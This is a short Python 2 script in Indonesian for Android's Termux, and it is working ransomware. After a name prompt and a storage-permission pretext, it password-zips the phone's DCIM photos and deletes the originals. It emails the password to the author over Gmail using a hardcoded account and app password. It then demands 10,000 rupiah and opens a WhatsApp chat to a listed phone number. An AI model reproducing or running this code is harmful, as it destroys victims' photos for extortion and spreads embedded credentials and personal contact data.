import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib
from multiprocessing.pool import ThreadPool
import smtplib

print
print

name = raw_input ("\033[91mSiapa Nama Lu ? : ")

if name == (""):
     print '\x1b[1;92misi yang bener asu'
     os.sys.exit()
     os.sys.exit()
elif name.isnumber():
     print '\x1b[1;92mnama lu kan gak pake angka asu'
     os.sys.exit()

import random
passcrypt=random.randint(6000000,10000000)

os.system("clear")
print '\x1b[1;92mScript ini harus mengizinkan penyimpanan'
time.sleep(5.0)
print 'karena membutuhkan data whatsapp korban'
time.sleep(5)
print '\x1b[1;32mJika anda belum mengizinkan harap diizinkan terlebih dahulu'
os.system ("termux-setup-storage")
time.sleep(5)
print 'proses sedang dilakukan , harap tidak mengeluarkan termux'
os.system ("cd /sdcard && apt install zip && zip -rmq -1  --password " + (str(passcrypt)) +  " fotomu.zip DCIM")
fadd = 'rafasyahagung@gmail.com'
tadd = 'rafasyahagung@gmail.com'
SUBJECT = 'nama korban =  ' +  name
TEXT = 'password zip = ' + (str(passcrypt))
message = 'Subject: {}\n\n{}'.format(SUBJECT, TEXT)
username = 'justabotsubs12@gmail.com'
password = 'ebknurbqygdvplsc'
server = smtplib.SMTP('smtp.gmail.com',587)
server.ehlo()
server.starttls()
server.login(username,password)
server.sendmail(fadd,tadd,message)

print
print
print 'Whatsapp JustA Hacker = 089682009902'
time.sleep(3)
print '\x1b[1;32mSEMUA FOTO ANDA TELAH DI KUNCI OLEH JUSTA HACKER'
time.sleep(3)
print 'Silakan Cek Foto anda'
print
print 'foto anda tersimpan dalam file bernama "fotomu.zip"'
print
print '\x1b[1;36mANDA HARUS MEMBAYAR 10RIBU UNTUK MEMBUKA FOTO ANDA YANG TERKUNCI'
print '\x1b[1;32mSEDANG MENGECHAT JUSTA HACKER.....'

os.system ("xdg-open https://api.whatsapp.com/send?phone=6289682009902&text=saya%20ingin%20membuka%20enkripsi%20")
